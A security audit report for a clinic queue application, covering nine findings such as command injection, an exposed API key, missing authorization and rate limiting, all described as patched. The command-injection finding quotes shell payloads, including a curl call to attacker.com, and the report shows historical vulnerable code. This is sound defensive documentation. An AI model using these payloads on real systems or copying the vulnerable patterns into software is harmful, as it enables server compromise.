# Heart Check PHC: Security Audit Report - API Leaks and Injection Risks

**Last Updated:** 2026-10-18  
**Audit Resolution Status:** 100% Fully Patched & Verified in Active Codebase

> [!NOTE]
> **All 9 Audited Findings Are Fully Patched in the Repository.**  
> Every security issue documented below (SEC-AUD-001 through SEC-AUD-009) has been patched and verified in the active codebase. The "Vulnerable Code (Historical)" sections show the original audit baselines, followed by the active verified remediations.

---

## 1. Executive Summary & Audit Scope

A static code analysis and architectural security review was conducted across the full Heart Check PHC repository:
- **Frontend Layer:** Next.js 16 App Router (`app/`), React presentation components, client-side hooks, and Server Actions (`app/actions/`).
- **Server Middleware & Route Handlers:** Next.js Edge Proxy (`proxy.ts`), authentication endpoints (`app/api/auth/`), hardware integration routes (`app/api/print-ticket/`), and administrative routes (`app/api/superadmin/`).
- **Database & Data Access Layer:** Supabase client wrappers (`lib/supabase/`), Row Level Security policies, RPC functions, and offline mutation queues (`lib/offlineQueue.ts`).
- **Analytical Backend:** FastAPI Python service (`python_backend/`), statistical forecasting modules, and Excel workbook generator.

### Audit Findings Overview

| Finding ID | Classification | Severity | Affected Component | Target File | Status |
| :--- | :--- | :---: | :--- | :--- | :---: |
| **SEC-AUD-001** | Command Injection | **CRITICAL** | Shell command interpolation via `child_process.exec()` | [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts#L41) | [x] Patched |
| **SEC-AUD-002** | Credential Exposure | **HIGH** | Third-party Deepgram API token exposed in browser bundle | [useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts#L31), [RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx#L37), [transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx#L391), [nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx#L192) | [x] Patched |
| **SEC-AUD-003** | Broken Access Control | **HIGH** | Unauthenticated SuperAdmin user sync route using Service Role Key | [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts#L9-L40) | [x] Patched |
| **SEC-AUD-004** | Mass Assignment / BOLA | **HIGH** | Unvalidated column mutations and missing historical record protections | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts#L23-L30) | [x] Patched |
| **SEC-AUD-005** | Toll Fraud / Rate Limiting | **MEDIUM** | Unauthenticated, unthrottled SMS dispatch Server Action | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts#L3-L53) | [x] Patched |
| **SEC-AUD-006** | Hardware Abuse / DoS | **MEDIUM** | Unauthenticated thermal printer trigger and unescaped ESC/POS input | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts#L21-L66) | [x] Patched |
| **SEC-AUD-007** | Historical Immutability | **LOW** | Missing defensive `is_historical = false` filters on operational updates | [app/nurse/hooks/useNurseActions.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/hooks/useNurseActions.ts#L97-L100), `app/transfer/hooks/` | [x] Patched |
| **SEC-AUD-008** | Toll Fraud / Rate Limiting | **MEDIUM** | Unthrottled external Deepgram speech synthesis proxy risking quota exhaustion | [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | [x] Patched |
| **SEC-AUD-009** | Broken Access Control | **HIGH** | Inadequate authorization guard on system settings route allowing non-superadmin mutation | [app/api/superadmin/settings/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/settings/route.ts) | [x] Patched |

---

## 2. Detailed Vulnerability Analyses & Patch Guidance

### SEC-AUD-001: OS Command Injection via Shell Interpolation (CRITICAL)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts#L41)
- **Vulnerability Type:** CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **Vulnerable Code (Historical Baseline):**
  ```typescript
  // Historical code in lib/printer.ts (Prior to patch)
  exec(`echo -e "${ticket}" > /dev/usb/lp2`, (error) => {
    if (error) { ... }
  });
  ```
- **Mechanics:**
  The legacy `sendToPrinter` helper function constructed the `ticket` string using template literal interpolation of `patientNum`, `serviceName`, and `cubicle`. It then passed the raw string into `exec()`. Node.js `child_process.exec()` invokes the host shell (`/bin/sh -c`).
- **Threat & Impact:**
  If an adversary submits a patient record or ticket number containing shell metacharacters (e.g. `; id;`, `$(curl http://attacker.com)`, or `` `whoami` ``), the shell executes the injected commands under the UID of the running Node.js process, yielding complete remote code execution (RCE) on the server.
- **Verified Remediation & Resolution:**
  1. `child_process.exec()` was completely eradicated from the repository.
  2. Direct filesystem writes to the thermal printer were implemented via `fs/promises.writeFile(path, buffer)` with non-printable character stripping via `sanitizePrinterText()`, eliminating the shell subprocess entirely.

---

### SEC-AUD-002: Third-Party Deepgram API Key Exposed in Client Bundle (HIGH)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Locations:**
  - [app/monitor/hooks/useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts)
  - [app/monitor/components/RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx)
  - [app/transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx)
  - [app/nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx)
- **Vulnerability Type:** CWE-522: Insufficiently Protected Credentials / CWE-798: Use of Hard-coded Credentials
- **Vulnerable Code (Historical Baseline):**
  ```typescript
  // Historical client code calling Deepgram directly from browser (Prior to patch)
  const response = await fetch(
    'https://api.deepgram.com/v1/speak?model=aura-2-amalthea-en',
    {
      method: 'POST',
      headers: {
        'Authorization': `Token ${process.env.NEXT_PUBLIC_DEEPGRAM_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ text }),
    }
  );
  ```
- **Mechanics:**
  In Next.js, environment variables prefixed with `NEXT_PUBLIC_` are inlined into the client-side JavaScript bundle during compilation. Four separate client components previously invoked the external Deepgram API directly from the browser using this key.
- **Threat & Impact:**
  Any user visiting `/monitor`, `/nurse`, or `/transfer` could inspect the browser Network tab or bundle sources to retrieve the raw Deepgram API key, allowing attackers to abuse the token or incur financial costs.
- **Verified Remediation & Resolution:**
  1. Converted `NEXT_PUBLIC_DEEPGRAM_KEY` to server-only `DEEPGRAM_API_KEY`.
  2. Created a dedicated server-side proxy route at `app/api/tts/route.ts` that attaches the server-side credential, proxies the request, and streams back binary audio.
  3. All client components now call internal `POST /api/tts` with zero credentials exposed in client bundles.

---

### SEC-AUD-003: Unauthenticated SuperAdmin User Synchronization Endpoint (HIGH)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts)
- **Vulnerability Type:** CWE-306: Missing Authentication for Critical Function
- **Vulnerable Code (Historical Baseline):**
  ```typescript
  // Historical code in sync-users/route.ts without guard (Prior to patch)
  export async function POST() {
    try {
      const { data: authUsers, error: authError } = await supabaseAdmin.auth.admin.listUsers();
      ...
  ```
- **Mechanics:**
  `proxy.ts` excludes all `/api/*` endpoints from edge middleware checks. While sibling routes in `app/api/superadmin/` invoked `requireSuperadmin(request)`, `sync-users` previously lacked any authorization guard while performing administrative user sync via `supabaseAdmin`.
- **Threat & Impact:**
  An unauthenticated actor on the hospital LAN or Internet could trigger user directory sync and receive internal database error details.
- **Verified Remediation & Resolution:**
  Enforced the `requireSuperadmin(request)` guard at the start of the `POST` handler, rejecting unauthenticated or non-superadmin callers with HTTP 401/403.

---

### SEC-AUD-004: Mass Assignment & Historical Data Mutation in `/api/rotate` (HIGH)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts)
- **Vulnerability Type:** CWE-915: Improperly Controlled Modification of Dynamically Determined Object Attributes / CWE-639: Authorization Bypass Through User-Controlled Key
- **Vulnerable Code (Historical Baseline):**
  ```typescript
  // Historical unvalidated update in rotate/route.ts (Prior to patch)
  let query = supabaseAdmin.from('patients').update(changes).eq('id', id);
  for (const [column, value] of Object.entries(expected ?? {})) {
    query = value === null ? query.is(column, null) : query.eq(column, value);
  }
  ```
- **Mechanics:**
  The legacy handler accepted an unvalidated `changes` dictionary from the request body and forwarded it directly to `.update(changes)` using `supabaseAdmin`, bypassing RLS without verifying column names or scoping to `is_historical = false`.
- **Threat & Impact:**
  An authenticated actor could modify arbitrary patient columns and alter historical research data used for forecasting models.
- **Verified Remediation & Resolution:**
  1. Enforced a strict column whitelist (`ALLOWED_UPDATE_FIELDS`) permitting only queue coordinates and timestamps.
  2. Enforced verified clinical role membership (`CLINICAL_ROLES.has(userProfile.role)`).
  3. Capped batch updates to 50 items.
  4. Explicitly appended `.eq('is_historical', false)` to protect research datasets.

---

### SEC-AUD-005: Unauthenticated SMS Dispatcher Server Action (MEDIUM)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts)
- **Vulnerability Type:** CWE-306: Missing Authentication / CWE-770: Allocation of Resources Without Limits or Throttling
- **Vulnerable Code (Historical Baseline):**
  ```typescript
  // Historical Server Action without auth or rate limits (Prior to patch)
  'use server';
  export async function sendSMS(phoneNum: string, patientNum: string, cubicleNum: string) {
    const credentials = Buffer.from(`${process.env.UNISMS_API_KEY}:`).toString('base64');
    const response = await fetch("https://unismsapi.com/api/sms", { ... });
  ```
- **Mechanics:**
  In Next.js, every `'use server'` export generates an open HTTP endpoint. `sendSMS` previously dispatched messages via UniSMS without checking session cookies or caller rate limits.
- **Threat & Impact:**
  External actors observing the Action ID could invoke `sendSMS` with arbitrary numbers to spam recipients and deplete prepaid SMS credits.
- **Verified Remediation & Resolution:**
  1. Enforced active clinical user session authentication via `supabase.auth.getUser()`.
  2. Enforced strict Philippine mobile format regex (`/^\+639\d{9}$/`).
  3. Implemented sliding-window rate limiting (max 20 SMS/minute per user) and a 10-second duplicate recipient cooldown.

---

### SEC-AUD-006: Unauthenticated Thermal Printer Route & ESC/POS Formatting (MEDIUM)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts)
- **Vulnerability Type:** CWE-306: Missing Authentication / CWE-20: Improper Input Validation
- **Mechanics:**
  `POST /api/print-ticket` accepted unauthenticated requests and previously attempted printing even if the queue ticket was fictitious or unregistered in the database.
- **Threat & Impact:**
  Devices on the hospital LAN could flood the endpoint with fake tickets, depleting thermal paper rolls.
- **Verified Remediation & Resolution:**
  1. Enforced database verification: queries `patients` matching `patientNum` and `.eq('is_historical', false)`. Rejects fake tickets with HTTP 404 before sending any bytes to the device.
  2. Implemented `isPrinterBusy` mutex flag to serialize prints and prevent buffer corruption.
  3. Sanitized all text inputs to strip illegal ESC/POS binary control codes.

---

### SEC-AUD-007: Missing Explicit `is_historical = false` Mutation Filters (LOW)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Locations:**
  - [app/nurse/hooks/useNurseActions.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/hooks/useNurseActions.ts)
  - [app/transfer/hooks/useIdlePatients.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useIdlePatients.ts)
  - [app/transfer/hooks/useTransferSelection.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useTransferSelection.ts)
  - [app/transfer/hooks/useDragAndDrop.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useDragAndDrop.ts)
  - [app/transfer/hooks/useRegistrationDragAndDrop.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/useRegistrationDragAndDrop.ts)
  - [app/transfer/hooks/usePatientData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/hooks/usePatientData.ts)
  - [lib/offlineQueue.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/offlineQueue.ts)
- **Vulnerability Type:** CWE-653: Improper Adherence to Principle of Least Privilege / Defense-in-Depth
- **Mechanics:**
  Operational workstation hooks previously constructed `.from('patients').update(...)` queries without explicitly asserting `.eq('is_historical', false)` in client SDK calls.
- **Threat & Impact:**
  If backend RLS policies were misconfigured or bypassed, operational updates could corrupt historical baseline datasets.
- **Verified Remediation & Resolution:**
  Every operational mutation query across all workstation hooks and offline queue sync logic explicitly asserts `.eq('is_historical', false)`. Additionally, PostgreSQL RESTRICTIVE RLS policies on the database enforce immutability at the engine level.

---

### SEC-AUD-008: Unthrottled External TTS Proxy & Quota Overrun Risk (MEDIUM)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts)
- **Vulnerability Type:** CWE-799: Improper Control of Generation of Code or Resource Consumption (Rate Limiting)
- **Mechanics:**
  The server TTS proxy route received announcement text and proxied it to Deepgram without IP-level rate limits or caching, creating potential for credit exhaustion or DoS.
- **Threat & Impact:**
  Rapid automated calls could exhaust Deepgram credits or take down queue audio callouts for waiting-room monitors.
- **Verified Remediation & Resolution:**
  Implemented sliding-window IP rate limiting (max 20 requests per minute per IP returning HTTP 429) and an in-memory LRU audio buffer cache (30-minute TTL, max 100 entries). Repeated announcements return in <1ms directly from server RAM at $0 external API cost.

---

### SEC-AUD-009: Inadequate Authorization on System Settings Route (HIGH)

- **Status:** [x] Fully Patched & Verified in Active Codebase
- **Location:** [app/api/superadmin/settings/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/settings/route.ts)
- **Vulnerability Type:** CWE-285: Improper Authorization
- **Mechanics:**
  The `PUT` handler for system settings previously used `requireUser(request)` rather than `requireSuperadmin(request)`. Because mutations execute via `supabaseAdmin`, any authenticated user (e.g. nurse, staff) could overwrite global application configuration.
- **Threat & Impact:**
  Non-administrative users could tamper with ticket prefixes, login lockout thresholds, or station timeouts.
- **Verified Remediation & Resolution:**
  Upgraded the authentication guard to `requireSuperadmin(request)`, strictly gating configuration mutations to verified superadmin accounts.

---

## 3. Verified System Security Strengths

The audit confirmed several well-implemented defensive controls across the repository:

1. **Zero Raw SQL Injection:** All database interactions in both Next.js and Python FastAPI use parameterized query builders (`supabase-js` and `supabase-py`). No raw SQL string concatenation (`f"SELECT ... {input}"`) exists anywhere in the codebase.
2. **Zero Cross-Site Scripting (XSS):** No instances of `dangerouslySetInnerHTML`, `eval()`, or `new Function()` exist. React's automatic entity escaping safely renders all patient numbers, names, and clinical notes.
3. **Supabase Service Role Isolation:** `SUPABASE_SERVICE_ROLE_KEY` is not prefixed with `NEXT_PUBLIC_` and is isolated to server runtimes ([lib/supabase/admin.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/supabase/admin.ts), route handlers, and data import tools).
4. **Server-Side Route Guarding:** [proxy.ts](file:///home/jensen/Github-Repositories/heart-check-phc/proxy.ts) enforces server-side authentication and role-based access control for `/superadmin`, `/dashboard`, `/nurse`, and `/transfer` before delivering HTML to the browser.
5. **Read-Only Analytical API:** All endpoints in [python_backend/main.py](file:///home/jensen/Github-Repositories/heart-check-phc/python_backend/main.py) are strictly read-only `GET` endpoints with typed parameters, local CORS origin filtering, and NaN/Infinity sanitization.
6. **Authentication Protections:** The login route ([app/api/auth/login/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/auth/login/route.ts)) enforces brute-force lockout thresholds via `login_attempts`, and password recovery enforces rate limits via `password_reset_attempts`.

---

## 4. Remediation Priority Matrix & Action Plan

| Priority | Remediation Action | Affected File | Process to Check | Expected Output | Status |
| :---: | :--- | :--- | :--- | :--- | :---: |
| **P0** | Eliminate OS command injection by deleting or rewriting printer helper | [lib/printer.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/printer.ts) | 1. Search codebase for `child_process.exec()`.<br>2. Call `sendToPrinter("1001; id", "OPD", "C1")`. | No `child_process.exec` invocations exist; direct `fs.writeFile` writes to `/dev/usb/lp*`; command characters are stripped without shell execution. | [x] Patched |
| **P0** | Enforce `requireSuperadmin` guard on user sync route | [app/api/superadmin/sync-users/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/sync-users/route.ts) | Send unauthenticated request: `curl -X POST http://localhost:3000/api/superadmin/sync-users`. | HTTP 401 Unauthorized `{"error":"Not authenticated"}`; unauthenticated sync requests rejected without modifying database. | [x] Patched |
| **P0** | Enforce `requireSuperadmin` guard on settings update route | [app/api/superadmin/settings/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/superadmin/settings/route.ts) | Send authenticated PUT request as nurse or registration staff. | HTTP 403 Forbidden `{"error":"Superadmin access required"}`; settings update blocked. | [x] Patched |
| **P1** | Move Deepgram TTS calls server-side and remove `NEXT_PUBLIC_` key | [useMonitorData.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/hooks/useMonitorData.ts), [RegistrationLayout.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/monitor/components/RegistrationLayout.tsx), [transfer/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/transfer/page.tsx), [nurse/page.tsx](file:///home/jensen/Github-Repositories/heart-check-phc/app/nurse/page.tsx), [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | Trigger queue speech on `/monitor` or `/nurse`; inspect browser DevTools Network tab and check for `NEXT_PUBLIC_DEEPGRAM_KEY` in bundle. | Requests routed through `POST /api/tts` returning `audio/mp3`; Deepgram API key is absent from client bundle assets. | [x] Patched |
| **P1** | Add IP rate limiting and audio buffer caching to TTS proxy route | [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | Send >20 POST requests in 60s; repeat identical ticket announcement. | HTTP 429 Too Many Requests once rate limit reached; repeated announcements return in <1ms with `X-Cache-Lookup: HIT`. | [x] Patched |
| **P1** | Apply schema whitelisting and `is_historical = false` check to `/api/rotate` | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts) | Send authenticated POST with non-whitelisted attribute (e.g. `medical_notes`) or targeting a row where `is_historical = true`. | Non-whitelisted fields stripped; queries condition on `.eq('is_historical', false)`; historical records cannot be updated (`applied: false`). | [x] Patched |
| **P1** | Add session verification and rate limiting to `sendSMS` action | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts) | 1. Call `sendSMS` without active session.<br>2. Pass invalid phone `12345`.<br>3. Send >20 messages in 60 seconds. | 1. `{ error: 'Unauthorized: Active clinical session required...' }`<br>2. `{ error: 'Invalid Philippine phone number format...' }`<br>3. `{ error: 'SMS dispatch rate limit exceeded...' }` | [x] Patched |
| **P2** | Require verified `patientRecord` before thermal ticket printing | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts) | Send POST to `/api/print-ticket` with fictitious `queueNumber: "99999"`. | HTTP 404 Not Found `{"error":"Queue ticket not found or invalid for printing."}`; zero bytes written to `/dev/usb/lp*`. | [x] Patched |
| **P2** | Append `.eq('is_historical', false)` to all client update mutations | `app/nurse/hooks/`, `app/transfer/hooks/`, `lib/offlineQueue.ts` | Inspect every `.update()` statement on the `patients` table across workstation hooks and offline queue sync. | All operational mutation queries explicitly condition on `.eq('is_historical', false)`, preventing research data corruption. | [x] Patched |

---

## 5. "Where to Edit" Security Configuration Map

| Security Aspect | Target Location | Description |
| :--- | :--- | :--- |
| **Server-Side Route Middleware** | [proxy.ts](file:///home/jensen/Github-Repositories/heart-check-phc/proxy.ts) | Role routing rules and cookie validation |
| **SuperAdmin Guards** | [lib/supabase/superadminGuard.ts](file:///home/jensen/Github-Repositories/heart-check-phc/lib/supabase/superadminGuard.ts) | `requireSuperadmin` token validation helper |
| **Authentication Handlers** | `app/api/auth/` | Login lockout, password reset, change password |
| **Hardware Printers** | [app/api/print-ticket/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/print-ticket/route.ts) | Thermal printer device buffer writing |
| **Server Actions** | [app/actions/sendSMS.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/actions/sendSMS.ts) | UniSMS dispatch server action |
| **TTS Audio Proxy** | [app/api/tts/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/tts/route.ts) | Server-side Deepgram audio synthesis proxy |
| **Patient Rotation Route** | [app/api/rotate/route.ts](file:///home/jensen/Github-Repositories/heart-check-phc/app/api/rotate/route.ts) | Dynamic queue rebalancing and status mutations |
| **Database Policies** | `docs/CHANGES_NEEDED.md`, `docs/SECURITY.md` | Supabase RLS and database trigger definitions |
| **FastAPI Analytics Security** | [python_backend/main.py](file:///home/jensen/Github-Repositories/heart-check-phc/python_backend/main.py) | CORS origins, query validation, and drilldown caching |
